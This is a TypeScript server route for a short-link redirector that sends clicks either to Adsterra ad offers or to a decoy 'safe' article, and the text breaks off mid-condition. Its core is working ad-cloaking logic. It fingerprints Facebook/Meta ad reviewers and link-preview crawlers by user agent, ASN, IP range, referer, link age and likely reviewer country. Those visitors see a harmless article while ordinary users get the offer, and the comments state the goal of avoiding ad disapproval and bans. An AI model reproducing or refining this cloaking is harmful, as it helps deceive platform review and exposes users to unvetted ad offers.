import { createFileRoute } from "@tanstack/react-router";
import { supabaseAdmin } from "@/integrations/supabase/client.server";
import type { Json } from "@/integrations/supabase/types";
import { type PrelandingTemplate, ARTICLE_TEMPLATES, pickArticleTemplateForCode } from "@/lib/prelanding-templates";
import {
  analyzeSignals,
  classifyReferrer,
  fingerprint,
  matchCloaking,
  matchReferrer,
  weightedPick,
  type CloakingRule,
  type ReferrerRule,
} from "@/lib/bot-detect";
import { pickWikipediaSafeUrl } from "@/lib/wikipedia-urls.server";

const SAFE_FALLBACK = "https://sleepox.com/";
// Higher = fewer false auto-blocks. 3 was way too aggressive on mobile carrier
// NATs where thousands of real users share one /24+UA bucket. 20 means we need
// 20 confirmed bot hits from the EXACT same fingerprint before locking it out.
const BOT_BLOCK_THRESHOLD = 20;

// Pure datacenter / hosting ASNs only. We intentionally do NOT include:
//   32934 (Facebook)  – FB in-app browser traffic comes from here
//   15169 (Google)    – Google Fiber + Android device traffic
//   8075  (Microsoft) – Bing + Outlook users
//   13335 (Cloudflare)– Warp / 1.1.1.1 routes real users through this
// Those were blocking ~60% of real mobile/proxy users. Real FB crawlers are
// still caught by the UA list in step 0; cloaking_rules can add more ASNs.
const BOT_ASNS = new Set(["16509", "14618"]);

type RedirectLink = {
  id: string;
  user_id: string;
  clicks_count: number | null;
  bot_clicks_count: number | null;
  adsterra_url: string | null;
  safe_url: string | null;
  safe_url_category: string | null;
  is_active: boolean;
  prelanding_template: PrelandingTemplate | "none";
  created_at: string | null;
};

// Facebook ad-review window: treat FB in-app browsers + FB referers as crawler
// for the first N hours after link creation, so ad reviewers always land on
// the safe article instead of the Adsterra offer.
// Smart FB ad-review protection:
// FB ad reviewer hits a brand-new link within the first ~hour, using FB in-app
// browser or l.facebook.com referer. After that, the same UA = real users.
// We protect ONLY when BOTH conditions are true:
//   (a) link is younger than FB_AD_REVIEW_WINDOW_HOURS, AND
//   (b) link has fewer than FB_AD_REVIEW_MAX_CLICKS total clicks
// Either threshold passed → real FB/IG users get the offer normally.
// FB crawler UAs (facebookexternalhit etc.) are ALWAYS blocked in step 0
// regardless of this window — ad approval safety is preserved.
const FB_AD_REVIEW_WINDOW_HOURS = 6;
const FB_AD_REVIEW_MAX_CLICKS = 25;

// ============================================================================
// CRAWLER / LINK-PREVIEW BOT DETECTION (module-scope, pre-compiled, O(1) test)
// ============================================================================
// CRITICAL: These bots MUST get article HTML (200 OK), never offer/safe redirect.
// If we redirect link-preview crawlers, FB/Meta ads get disapproved + account bans.
//
// Sources: https://developers.facebook.com/docs/sharing/webmasters/web-crawlers/
//          (last verified 2026-06)
// Each pattern is a lowercase substring of the UA string.
const FB_META_UA = [
  // Official Meta crawlers (https://developers.facebook.com/docs/sharing/webmasters/web-crawlers/)
  "facebookexternalhit",   // primary link-preview scraper for FB/IG/Messenger
  "facebot",                // legacy FB crawler
  "facebookcatalog",        // FB Catalog / Commerce crawler
  "facebookplatform",       // FB Platform debugger
  "meta-externalagent",     // AI/training crawler
  "meta-externalfetcher",   // on-demand AI fetcher (bypasses robots.txt)
  "meta-externalads",       // ads quality crawler (NEW 2025)
  "meta-webindexer",        // Meta AI search indexer (NEW 2025)
  "metainspector",          // OG debugger
  "instagram-fbexternalhit",// IG-specific OG fetcher
];
const SOCIAL_PREVIEW_UA = [
  // Other social/messenger link-preview crawlers
  "whatsapp",               // WhatsApp/2.x link preview
  "twitterbot",             // Twitter/X card validator
  "linkedinbot",            // LinkedIn share preview
  "linkedin-newsletter",
  "telegrambot",
  "discordbot",
  "slackbot",
  "slack-imgproxy",
  "pinterestbot",
  "redditbot",
  "skypeuripreview",
  "snapchat",
  "tiktokbot",
  "bytespider",             // TikTok parent ByteDance crawler
  "vkshare",
  "viberbot",
  "kakaotalk-scrap",        // KakaoTalk link preview
  "line-livecheck",         // LINE messenger preview
  "yahoo! slurp",           // Yahoo Messenger / mail preview
  "naverbot",               // Naver (Korea)
  "qwantify",
];
const SEARCH_ENGINE_UA = [
  // Major search engines & ad quality bots — DO NOT serve offer to them
  "googlebot",
  "adsbot-google",
  "google-adwords",
  "google-inspectiontool",
  "googleother",
  "google-extended",
  "bingbot",
  "adidxbot",                // Bing Ads
  "msnbot",
  "duckduckbot",
  "yandexbot",
  "baiduspider",
  "applebot",                // Apple Spotlight / Siri / iMessage preview
  "petalbot",                // Huawei
  "mojeekbot",
  "ia_archiver",
  "archive.org_bot",
];
// Compiled once at module load — single substring scan per request.
const CRAWLER_UA_LIST: readonly string[] = [
  ...FB_META_UA,
  ...SOCIAL_PREVIEW_UA,
  ...SEARCH_ENGINE_UA,
] as const;
// Fast regex for one-pass detection. Escaped, alternation, case-insensitive.
const CRAWLER_UA_RE = new RegExp(
  CRAWLER_UA_LIST.map((p) => p.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("|"),
  "i",
);
// Subset that should be treated as FB-class (serves article + ad-safety path)
const FB_CLASS_RE = new RegExp(
  FB_META_UA.map((p) => p.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("|"),
  "i",
);

// Meta/Facebook ASN ranges (verified via PeeringDB + Meta network docs)
//   32934 — Facebook, Inc.
//   63293 — Facebook
//   54115 — Facebook (edge / WhatsApp infra)
const FB_ASN_SET = new Set(["32934", "63293", "54115"]);
// Meta-owned IP prefixes (most common reviewer egress ranges).
// IMPORTANT: keep both IPv4 AND IPv6 — Facebook's crawler is now mostly IPv6
// out of 2a03:2880::/29. Missing the IPv6 prefix caused real FB crawlers to
// be flagged as "spoofers" and redirected → ad rejections.
const FB_IP_PREFIX_LIST = [
  // IPv4
  "31.13.",
  "157.240.",
  "66.220.",
  "69.63.",
  "69.171.",
  "173.252.",
  "204.15.20.",
  "199.201.64.",
  "129.134.",                // Meta corp
  "179.60.192.",
  "185.60.216.",
  "185.60.218.",
  "102.132.",                // Meta Africa edge
  // IPv6 — Facebook AS32934 owns 2a03:2880::/32, current crawler egress
  "2a03:2880:",
  "2620:0:1c00:",            // Meta corp v6
  "2620:0:1cff:",
  "2a03:83e0:",              // WhatsApp edge v6
];


function detectDevice(ua: string): "mobile" | "tablet" | "desktop" {
  const u = ua.toLowerCase();
  if (/ipad|tablet|playbook|silk/.test(u)) return "tablet";
  if (/mobile|iphone|android|phone|webos|opera mini/.test(u)) return "mobile";
  return "desktop";
}

// ------- In-memory Cache for High Traffic (TTL 2-5 mins) -------
// Drastically reduces DB load by caching global rules & settings.
const globalCache = {
  settings: null as any,
  cloaking: [] as any[],
  referrer: [] as any[],
  whitelist: [] as Array<{ id: string; rule_type: string; pattern: string; label: string | null }>,
  botRules: [] as Array<{ pattern: string | null; label: string | null; rule_type: string }>,
  tiers: new Map<string, number>(),
  lastFetch: 0,
};
const CACHE_TTL = 3 * 60 * 1000; // 3 mins

type CacheHit<T> = { value: T; expiresAt: number };
const LINK_CACHE_TTL_MS = 10 * 60 * 1000;
const PROFILE_CACHE_TTL_MS = 60 * 1000;
const OFFER_CACHE_TTL_MS = 5 * 60 * 1000;
const FP_CACHE_TTL_MS = 10 * 60 * 1000;
const REDIRECT_CACHE_MAX = 50_000;
const linkCache = new Map<string, CacheHit<RedirectLink>>();
const profileQuotaCache = new Map<string, CacheHit<{ click_quota: number | null; clicks_used: number | null } | null>>();
const offerCache = new Map<string, CacheHit<{ abRows: any[]; geoRows: any[] }>>();
const fpBlockedCache = new Map<string, CacheHit<boolean>>();

function cacheGet<T>(cache: Map<string, CacheHit<T>>, key: string): T | null {
  const hit = cache.get(key);
  if (!hit) return null;
  if (hit.expiresAt <= Date.now()) {
    cache.delete(key);
    return null;
  }
  return hit.value;
}

function cacheSet<T>(cache: Map<string, CacheHit<T>>, key: string, value: T, ttlMs: number) {
  if (cache.size >= REDIRECT_CACHE_MAX) {
    const firstKey = cache.keys().next().value;
    if (firstKey) cache.delete(firstKey);
  }
  cache.set(key, { value, expiresAt: Date.now() + ttlMs });
}

async function refreshGlobalCache() {
  const now = Date.now();
  if (now - globalCache.lastFetch < CACHE_TTL && globalCache.settings) return;

  try {
    const [s, c, r, t, w, br] = await Promise.all([
      supabaseAdmin.from("app_settings").select("*").eq("id", true).maybeSingle(),
      supabaseAdmin.from("cloaking_rules").select("*").eq("is_active", true).order("priority"),
      supabaseAdmin.from("referrer_rules").select("*").eq("is_active", true),
      supabaseAdmin.from("country_tiers").select("country_code, tier"),
      supabaseAdmin.from("bot_whitelist" as never).select("id, rule_type, pattern, label").eq("is_active", true),
      supabaseAdmin.from("bot_rules").select("pattern, label, rule_type").eq("is_active", true),
    ]);
    if (s.data) globalCache.settings = s.data;
    if (c.data) globalCache.cloaking = c.data;
    if (r.data) globalCache.referrer = r.data;
    if ((w as any).data) globalCache.whitelist = (w as any).data as any;
    if (br.data) globalCache.botRules = br.data as any;
    if (t.data) {
      globalCache.tiers.clear();
      t.data.forEach((row: any) => globalCache.tiers.set(row.country_code.toUpperCase(), row.tier));
    }
    globalCache.lastFetch = now;
  } catch (e) {
    console.error("[cache] failed to refresh global config", e);
    globalCache.lastFetch = now;
  }
}

// Whitelist matcher — returns matching rule if request signature is explicitly
// trusted (real-user ASN/UA/Referrer combos). FB crawler block runs BEFORE
// this, so whitelist can never bypass ad-safety protection.
function matchWhitelist(
  rules: Array<{ id: string; rule_type: string; pattern: string; label: string | null }>,
  ctx: { ua: string; asn: string | null; ip: string | null; ref: string; country: string | null },
): { id: string; label: string } | null {
  const uaLow = ctx.ua.toLowerCase();
  const refLow = ctx.ref.toLowerCase();
  for (const r of rules) {
    const p = (r.pattern || "").toLowerCase().trim();
    if (!p) continue;
    let hit = false;
    if (r.rule_type === "ua") hit = uaLow.includes(p);
    else if (r.rule_type === "asn") hit = !!ctx.asn && ctx.asn === p;
    else if (r.rule_type === "ip") hit = !!ctx.ip && ctx.ip.startsWith(p);
    else if (r.rule_type === "ref") hit = refLow === p || refLow.endsWith(`.${p}`);
    else if (r.rule_type === "combo") {
      // Format: ua=fban&asn=32934&ref=facebook.com&ip=157.240.&country=us
      // ALL listed conditions must match (case-insensitive).
      const parts = p.split("&").map((x) => x.trim()).filter(Boolean);
      hit = parts.length > 0 && parts.every((kv) => {
        const [k, ...rest] = kv.split("=");
        const v = rest.join("=").trim();
        if (!v) return false;
        if (k === "ua") return uaLow.includes(v);
        if (k === "asn") return ctx.asn === v;
        if (k === "ip") return !!ctx.ip && ctx.ip.startsWith(v);
        if (k === "ref") return refLow === v || refLow.endsWith(`.${v}`);
        if (k === "country") return (ctx.country || "").toLowerCase() === v;
        return false;
      });
    }
    if (hit) return { id: r.id, label: r.label || `${r.rule_type}:${p}` };
  }
  return null;
}

// ------- IP → Country lookup (workerd-compatible, no native deps) -------
// Cache by /24 subnet to drastically reduce upstream calls under high traffic.
const countryCache = new Map<string, { c: string; exp: number }>();
const COUNTRY_TTL_MS = 24 * 60 * 60 * 1000; // 24h
const COUNTRY_CACHE_MAX = 50_000;

function subnetKey(ip: string): string {
  if (ip.includes(":")) return ip.split(":").slice(0, 4).join(":"); // IPv6 /64-ish
  const parts = ip.split(".");
  return parts.length === 4 ? `${parts[0]}.${parts[1]}.${parts[2]}.0` : ip;
}

async function lookupCountryByIp(ip: string): Promise<string> {
  const key = subnetKey(ip);
  const now = Date.now();
  const hit = countryCache.get(key);
  if (hit && hit.exp > now) return hit.c;

  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 1200);
    const r = await fetch(`https://api.country.is/${encodeURIComponent(ip)}`, {
      signal: ctrl.signal,
      headers: { accept: "application/json" },
    });
    clearTimeout(t);
    if (r.ok) {
      const j = (await r.json()) as { country?: string };
      const c = (j.country || "").toUpperCase();
      if (countryCache.size >= COUNTRY_CACHE_MAX) {
        const firstKey = countryCache.keys().next().value;
        if (firstKey) countryCache.delete(firstKey);
      }
      countryCache.set(key, { c, exp: now + COUNTRY_TTL_MS });
      return c;
    }
  } catch (e) {
    console.warn("[redirect] country lookup failed", (e as Error)?.message);
  }
  // Negative cache for 5 min to avoid hammering on bad IPs
  countryCache.set(key, { c: "", exp: now + 5 * 60 * 1000 });
  return "";
}



function sanitizeRedirectTarget(target: string | null | undefined): string {
  try {
    if (!target) return SAFE_FALLBACK;
    const parsed = new URL(target);
    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return SAFE_FALLBACK;
    return parsed.toString();
  } catch {
    return SAFE_FALLBACK;
  }
}

function redirectTo(
  target: string | null | undefined,
  route: "safe" | "offer" | "ours" | "fallback",
  reason?: string | null,
) {
  const headers = new Headers({
    Location: sanitizeRedirectTarget(target),
    "Cache-Control": "no-store",
    "X-Sleepox-Route": route,
  });
  if (reason)
    headers.set("X-Sleepox-Reason", reason.replace(/[^a-zA-Z0-9:._ -]/g, "").slice(0, 80));
  return new Response(null, { status: 302, headers });
}

export async function recordRedirectClick(input: {
  linkId: string;
  userId: string;
  ip: string | null;
  country: string | null;
  ua: string | null;
  isBot: boolean;
  botReason: string | null;
  routedTo: "safe" | "offer" | "ours" | "fb-article";
  utm: Record<
    "utm_source" | "utm_medium" | "utm_campaign" | "utm_term" | "utm_content",
    string | null
  >;
  refererHost: string | null;
  botScore: number;
  signals: Record<string, unknown>;
  challengePassed: boolean;
  fingerprintHash?: string | null;
  abVariant?: string | null;
}) {
  const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

  const runWithRetry = async <T>(task: () => Promise<T>, attempts = 3) => {
    let lastError: unknown;

    for (let attempt = 1; attempt <= attempts; attempt += 1) {
      try {
        return await task();
      } catch (error) {
        lastError = error;
        if (attempt < attempts) {
          await wait(120 * attempt);
        }
      }
    }

    throw lastError;
  };

  const persistClickAtomically = async () => {
    await runWithRetry(async () => {
      const { error: rpcError } = await supabaseAdmin.rpc(
        "record_redirect_click" as never,
        {
          _link_id: input.linkId,
          _user_id: input.userId,
          _ip: input.ip,
          _country: input.country,
          _ua: input.ua,
          _is_bot: input.isBot,
          _bot_reason: input.botReason,
          _routed_to: input.routedTo,
          _utm_source: input.utm?.utm_source ?? null,
          _utm_medium: input.utm?.utm_medium ?? null,
          _utm_campaign: input.utm?.utm_campaign ?? null,
          _utm_term: input.utm?.utm_term ?? null,
          _utm_content: input.utm?.utm_content ?? null,
          _referer_host: input.refererHost ?? null,
          _bot_score: input.botScore ?? null,
          _signals: (input.signals ?? {}) as Json,
          _challenge_passed: input.challengePassed,
        } as never,
      );

      if (rpcError) throw rpcError;
    });
  };

  // Use the long-lived DB function already present in the schema cache.
  // It inserts the click and increments counters with SQL-side +1 updates,
  // so we avoid both lost-update races and VPS schema-cache drift on new RPCs.
  await persistClickAtomically();

  // Bot fingerprint learning (separate RPC, atomic upsert)
  if (input.fingerprintHash) {
    await supabaseAdmin.rpc(
      "record_bot_fingerprint" as never,
      {
        _hash: input.fingerprintHash,
        _is_bot: input.isBot,
        _ip: input.ip,
        _ua: input.ua,
        _country: input.country,
        _block_threshold: BOT_BLOCK_THRESHOLD,
      } as never,
    );
  }

  // A/B variant click counter (atomic increment via RPC)
  if (input.abVariant && !input.isBot) {
    try {
      const { error: abError } = await supabaseAdmin.rpc(
        "increment_ab_variant_clicks" as never,
        {
          _link_id: input.linkId,
          _variant_label: input.abVariant,
        } as never,
      );
      if (abError) throw abError;
    } catch (e) {
      console.error("ab variant click increment failed", e);
    }
  }
}


export async function lookupRedirectLink(
  code: string,
): Promise<{ link: RedirectLink | null; error: Error | null }> {
  const cached = cacheGet(linkCache, code);
  // Retry on transient PostgREST failures (PGRST002 schema cache reload,
  // upstream 503, connection blips). Without this, a 200ms schema reload
  // would make us treat the link as "not found" and redirect real users +
  // FB ad reviewers to the homepage → ad rejections.
  let res: Awaited<ReturnType<typeof supabaseAdmin.from>> extends never ? never : any = null;
  let lastErr: any = null;
  for (let attempt = 1; attempt <= 2; attempt += 1) {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 1800);
    try {
      const query = supabaseAdmin
        .from("links")
        .select("*")
        .eq("short_code", code)
        .maybeSingle();
      res = await (query as any).abortSignal(ctrl.signal);
    } finally {
      clearTimeout(timer);
    }
    if (!res.error) { lastErr = null; break; }
    lastErr = res.error;
    const msg = String(res.error?.message || "");
    const errCode = String((res.error as any)?.code || "");
    const transient =
      errCode === "PGRST002" ||
      errCode === "PGRST001" ||
      /schema cache|upstream|fetch failed|timeout|ECONN|EAI_AGAIN|503|502|504/i.test(msg);
    if (!transient) break;
    await new Promise((r) => setTimeout(r, 120 * attempt));
  }
  if (lastErr) return cached ? { link: cached, error: null } : { link: null, error: lastErr as unknown as Error };
  const row = res.data as Record<string, unknown> | null;
  if (!row) return { link: null, error: null };

  const adsterraDirect = (row.adsterra_direct_link as string | null) ?? null;
  const destination = (row.destination_url as string | null) ?? null;
  const adsterra = (row.adsterra_url as string | null) ?? adsterraDirect ?? destination ?? null;
  const safe =
    (row.safe_url as string | null) ?? (adsterraDirect ? destination : null) ?? SAFE_FALLBACK;
  const isActive =
    typeof row.is_active === "boolean" ? (row.is_active as boolean) : row.status === "active";
  // Deterministic per-short-code article template. Same code → same article
  // every scrape (matches FB's cached preview). Different codes → different
  // articles. Never random — random would drift FB's cached preview away from
  // what the human reviewer approved → ad disapproval risk.
  const storedTpl = (row.prelanding_template as string) || "";
  const validTpl: RedirectLink["prelanding_template"] = (
    ARTICLE_TEMPLATES.includes(storedTpl as PrelandingTemplate)
      ? storedTpl
      : pickArticleTemplateForCode(code)
  ) as RedirectLink["prelanding_template"];

  const link = {
    id: row.id as string,
    user_id: row.user_id as string,
    clicks_count: (row.clicks_count as number | null) ?? 0,
    bot_clicks_count: (row.bot_clicks_count as number | null) ?? 0,
    adsterra_url: adsterra,
    safe_url: safe || SAFE_FALLBACK,
    safe_url_category: (row.safe_url_category as string | null) ?? null,
    is_active: isActive,
    prelanding_template: validTpl,
    created_at: (row.created_at as string | null) ?? null,
  };
  cacheSet(linkCache, code, link, LINK_CACHE_TTL_MS);

  return {
    error: null,
    link,
  };
}

async function getFingerprintAutoBlocked(fpHash: string): Promise<boolean> {
  const cached = cacheGet(fpBlockedCache, fpHash);
  if (cached !== null) return cached;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 900);
  try {
    const query = supabaseAdmin
      .from("bot_fingerprints")
      .select("auto_blocked")
      .eq("fingerprint_hash", fpHash)
      .maybeSingle();
    const { data, error } = await (query as any).abortSignal(ctrl.signal);
    const blocked = !error && !!data?.auto_blocked;
    cacheSet(fpBlockedCache, fpHash, blocked, FP_CACHE_TTL_MS);
    return blocked;
  } catch {
    return false;
  } finally {
    clearTimeout(timer);
  }
}

async function getProfileQuota(userId: string): Promise<{ click_quota: number | null; clicks_used: number | null } | null> {
  const cached = cacheGet(profileQuotaCache, userId);
  if (cached !== null) return cached;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 900);
  try {
    const query = supabaseAdmin
      .from("profiles")
      .select("click_quota, clicks_used")
      .eq("id", userId)
      .maybeSingle();
    const { data, error } = await (query as any).abortSignal(ctrl.signal);
    if (error) throw error;
    cacheSet(profileQuotaCache, userId, data ?? null, PROFILE_CACHE_TTL_MS);
    return data ?? null;
  } catch (error) {
    console.error("redirect profile lookup failed", {
      userId,
      message: (error as Error)?.message || String(error),
    });
    return null;
  } finally {
    clearTimeout(timer);
  }
}

async function getOfferRows(linkId: string): Promise<{ abRows: any[]; geoRows: any[] }> {
  const cached = cacheGet(offerCache, linkId);
  if (cached) return cached;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 900);
  try {
    const [ab, geo] = await Promise.all([
      (supabaseAdmin
        .from("ab_variants")
        .select("variant_label, offer_url, weight_pct")
        .eq("link_id", linkId)
        .eq("is_active", true) as any).abortSignal(ctrl.signal),
      (supabaseAdmin
        .from("geo_offers")
        .select("tier, country_codes, offer_url, weight")
        .eq("link_id", linkId)
        .eq("is_active", true) as any).abortSignal(ctrl.signal),
    ]);
    const value = { abRows: ab.error ? [] : ab.data ?? [], geoRows: geo.error ? [] : geo.data ?? [] };
    cacheSet(offerCache, linkId, value, OFFER_CACHE_TTL_MS);
    return value;
  } catch {
    return { abRows: [], geoRows: [] };
  } finally {
    clearTimeout(timer);
  }
}

import { logServerError } from "@/lib/error-log.server";

async function safeHandle(request: Request, code: string, record: boolean) {
  try {
    return await handleRedirect(request, code, record);
  } catch (err) {
    // Last-resort: log + safe redirect so traffic never breaks.
    await logServerError("redirect", err, {
      code,
      url: request.url,
      ua: request.headers.get("user-agent") || "",
      ip:
        request.headers.get("cf-connecting-ip") ||
        request.headers.get("x-forwarded-for") ||
        "",
    });
    return new Response(null, {
      status: 302,
      headers: {
        Location: SAFE_FALLBACK,
        "Cache-Control": "no-store",
        "X-Sleepox-Route": "fallback",
        "X-Sleepox-Reason": "handler-crash",
      },
    });
  }
}

export const Route = createFileRoute("/r/$code")({
  server: {
    handlers: {
      HEAD: async ({ request, params }) => safeHandle(request, params.code, false),
      GET: async ({ request, params }) => safeHandle(request, params.code, true),
    },
  },
});

async function handleRedirect(request: Request, code: string, shouldRecordClick = true) {
  const url = new URL(request.url);
  const ua = request.headers.get("user-agent") || "";
  const referer = request.headers.get("referer") || "";
  const asn = request.headers.get("cf-asn") || "";
  const ip =
    request.headers.get("cf-connecting-ip") ||
    request.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
    request.headers.get("x-real-ip") ||
    "";

  // Country: prefer CDN headers, then IP geolocation, then Accept-Language hint
  let country =
    request.headers.get("cf-ipcountry") ||
    request.headers.get("x-vercel-ip-country") ||
    request.headers.get("x-country-code") ||
    "";
  const acceptLanguage = request.headers.get("accept-language") || "";
  if (!country && ip && ip !== "127.0.0.1" && !ip.startsWith("::1")) {
    country = await lookupCountryByIp(ip);
  }
  if (!country && acceptLanguage) {
    // last-resort: en-BD,en;q=0.9 → BD
    const m = acceptLanguage.match(/[a-z]{2}-([A-Z]{2})/);
    if (m) country = m[1];
  }
  country = (country || "").toUpperCase();

  const accept = request.headers.get("accept") || "";
  const acceptEncoding = request.headers.get("accept-encoding") || "";
  const secChUa = request.headers.get("sec-ch-ua") || "";
  const ja3 = request.headers.get("cf-ja3") || request.headers.get("x-ja3-hash") || "";

  const detectInput = {
    ua,
    ip,
    asn,
    country,
    referer,
    acceptLanguage,
    accept,
    acceptEncoding,
    secChUa,
    ja3,
  };
  const fpHash = fingerprint(detectInput);
  const refererDomain = (() => {
    try {
      return referer ? new URL(referer).hostname : "";
    } catch {
      return "";
    }
  })();
  const referrerSource = classifyReferrer(refererDomain);

  // Optimized parallel fetch: link, fp blacklist, profile
  // Global settings/rules are served from in-memory cache to handle huge traffic.
  await refreshGlobalCache();

  const [
    { link, error: linkError },
    fpAutoBlocked,
  ] = await Promise.all([
    lookupRedirectLink(code),
    getFingerprintAutoBlocked(fpHash),
  ]);

  if (linkError) console.error("redirect link lookup failed", { code, message: linkError.message });

  if (!link || !link.is_active) {
    return redirectTo(SAFE_FALLBACK, "fallback", !link ? "link-not-found" : "link-inactive");
  }

  // Use cached data
  const settings = globalCache.settings;
  const cloakingRules = globalCache.cloaking as CloakingRule[];
  const referrerRules = globalCache.referrer as ReferrerRule[];
  const countryTier = globalCache.tiers.get(country) ?? 3;

  const OUR_URL = settings?.our_adsterra_url || SAFE_FALLBACK;
  // SAFETY CLAMP: never allow misconfigured settings to push 100% of traffic
  // to OUR_URL. THRESHOLD floor = 100 → max injection probability = 33%.
  const THRESHOLD = Math.max(100, settings?.injection_threshold ?? 5000);
  const INJECT_COUNT = Math.max(0, Math.min(50, settings?.injection_count ?? 50));
  // Daily 1-ad-per-visitor cap is currently disabled at the schema level (no
  // visitor-state table). Keep variable for future revival but force false so
  // the misleading `dailyAdEnabled` setting does not silently change behaviour.
  const visitorAlreadySawAdToday = false;




  let isBot = false;
  let isFbBot = false;
  let reason: string | null = null;
  let whitelistHit: { id: string; label: string } | null = null;

  // 0. HARDCODED Facebook / Meta / social / search crawler detection.
  // ALWAYS runs first, DB-independent, pre-compiled regex → single substring scan.
  // CRITICAL: FB ad reviewers + link-preview crawlers MUST get article HTML (200 OK).
  // If we redirect them, ads get disapproved and accounts get banned.
  // NOTE: Real IG/FB in-app users send "FBAN/FBAV/Instagram" UAs and DO NOT match
  // CRAWLER_UA_RE — they hit the offer normally.
  const uaLowFb = ua.toLowerCase();
  const crawlerMatch = uaLowFb.length >= 5 ? CRAWLER_UA_RE.exec(uaLowFb) : null;
  const fromMetaNetwork =
    (asn && FB_ASN_SET.has(asn)) ||
    (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
  if (crawlerMatch) {
    const matchedUa = crawlerMatch[0];
    const looksLikeFbClass = FB_CLASS_RE.test(matchedUa);
    // For FB-class UAs we ALWAYS serve the article (isFbBot=true), even if
    // the IP/ASN does not look like Meta's network. Reason: missing a real FB
    // reviewer = ad rejection (catastrophic). Serving article HTML to a
    // human spoofer is harmless — they just see the article page. The old
    // "spoof → safe_url" path was misclassifying real FB IPv6 crawlers
    // (2a03:2880::/29) and getting ads disapproved.
    isBot = true;
    isFbBot = looksLikeFbClass;
    reason = looksLikeFbClass
      ? (fromMetaNetwork ? `fb-ua:${matchedUa}` : `fb-ua-noverify:${matchedUa}`)
      : `crawler-ua:${matchedUa}`;
  } else if (asn && FB_ASN_SET.has(asn)) {
    // Meta-owned ASN with no real-browser UA marker → reviewer/scraper.
    isBot = true;
    isFbBot = true;
    reason = `fb-asn:${asn}`;
  } else if (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p))) {
    isBot = true;
    isFbBot = true;
    reason = `fb-ip:${ip.split(".").slice(0, 2).join(".")}`;
  }



  // 0b. FB AD-REVIEW WINDOW: during the first FB_AD_REVIEW_WINDOW_HOURS after
  // link creation, treat FB/IG in-app browsers AND clicks coming from FB/IG
  // domains as crawler traffic. Facebook's deep ad-review opens the link in a
  // real headless Chrome from a clean US IP, often via l.facebook.com referer
  // or inside the FB in-app browser (FBAN/FBAV/FB_IAB UA). Serving the
  // Adsterra offer to that reviewer = ad rejected. After the window passes,
  // these visitors get the normal offer like any other user.
  if (!isBot) {
    const fbReviewEnabled = (settings as any)?.fb_review_protection_enabled ?? true;
    const linkAgeMs = link.created_at
      ? Date.now() - new Date(link.created_at).getTime()
      : Number.POSITIVE_INFINITY;
    // Use human clicks only — bot_clicks_count is incremented by every FB
    // crawler hit, so including it would prematurely close the review window
    // on popular ads and the next real ad reviewer would receive the offer.
    const totalClicks = link.clicks_count ?? 0;
    const inReviewWindow =
      fbReviewEnabled &&
      linkAgeMs < FB_AD_REVIEW_WINDOW_HOURS * 60 * 60 * 1000 &&
      totalClicks < FB_AD_REVIEW_MAX_CLICKS;
    if (inReviewWindow) {
      // FB ad reviewer uses `facebookexternalhit` UA (already caught in step 0)
      // OR a real headless Chrome from clean US IP often with l.facebook.com referer.
      // Real users clicking from FB/IG app have FBAN/FBAV UA — those are REAL
      // HUMANS, not reviewers. Blocking them = massive revenue loss.
      //
      // Conservative rule: only block during review window when BOTH
      //   (a) referer is a Facebook/Instagram domain (l.facebook.com etc.), AND
      //   (b) UA does NOT contain FBAN/FBAV/Instagram markers
      // That covers headless-Chrome reviewer (no FB app marker but FB referer)
      // and lets all real in-app users through normally.
      const FB_REFERER_HOSTS = [
        "facebook.com",
        "l.facebook.com",
        "lm.facebook.com",
        "m.facebook.com",
        "web.facebook.com",
        "business.facebook.com",
        "fb.me",
        "fb.watch",
        "instagram.com",
        "l.instagram.com",
        "messenger.com",
        "l.messenger.com",
      ];
      const refLow = refererDomain.toLowerCase();
      const fbRefHit = FB_REFERER_HOSTS.find(
        (h) => refLow === h || refLow.endsWith(`.${h}`),
      );
      const hasFbAppMarker = /fban|fbav|fb_iab|fbios|fbss|instagram|messenger/i.test(uaLowFb);
      if (fbRefHit && !hasFbAppMarker) {
        isBot = true;
        isFbBot = true;
        reason = `fb-ref-review:${fbRefHit}`;
      }

      // NEW: catch FB ad reviewers who land with NO referer (direct hit) from
      // a US/EU IP using a regular desktop or headless-Chrome UA during the
      // ad-review window. Pattern observed in production: country=US, ref=direct,
      // UA = plain Chrome/Safari with no FBAN/FBAV marker, link <6h old, <25 clicks.
      // Outside the review window this rule does NOT fire, so real US/EU users
      // are unaffected once the campaign matures.
      if (!isBot) {
        const REVIEWER_COUNTRIES = new Set(["US", "IE", "GB", "DE", "SG", "NL"]);
        const isReviewerGeo = !!country && REVIEWER_COUNTRIES.has(country);
        const isDirect = !refererDomain; // no referer header at all
        // Real social-app users from these countries always carry FB/IG/Messenger
        // markers in their UA. A plain desktop UA hitting a fresh link directly
        // from a Meta-reviewer geo is almost certainly an ad-review fetch.
        if (isReviewerGeo && isDirect && !hasFbAppMarker) {
          isBot = true;
          isFbBot = true;
          reason = `fb-reviewer-geo:${country}`;
        }
      }
    }
  }


  // 0c. WHITELIST — explicit exception rules for trusted ASN/UA/Referrer combos.
  // Runs AFTER FB crawler block so ad safety is never bypassed. If matched,
  // we skip all subsequent bot detection and force routing as a real user.
  if (!isBot && globalCache.whitelist.length > 0) {
    const wl = matchWhitelist(globalCache.whitelist, {
      ua,
      asn,
      ip: ip || null,
      ref: refererDomain,
      country: country || null,
    });
    if (wl) {
      whitelistHit = wl;
      // Fire-and-forget hit counter — non-blocking, OK to lose under load.
      Promise.resolve(
        supabaseAdmin.rpc("record_whitelist_hit" as never, { _id: wl.id } as never)
      ).catch(() => {});
    }
  }

  // 1. Cloaking rules (DB-driven, additional patterns)
  if (!isBot && !whitelistHit) {
    const cloakHit = matchCloaking(detectInput, cloakingRules);
    if (cloakHit && cloakHit.rule.action === "safe") {
      isBot = true;
      reason = cloakHit.matchKey;
      if (
        cloakHit.matchKey.includes("facebook") ||
        cloakHit.matchKey.includes("meta") ||
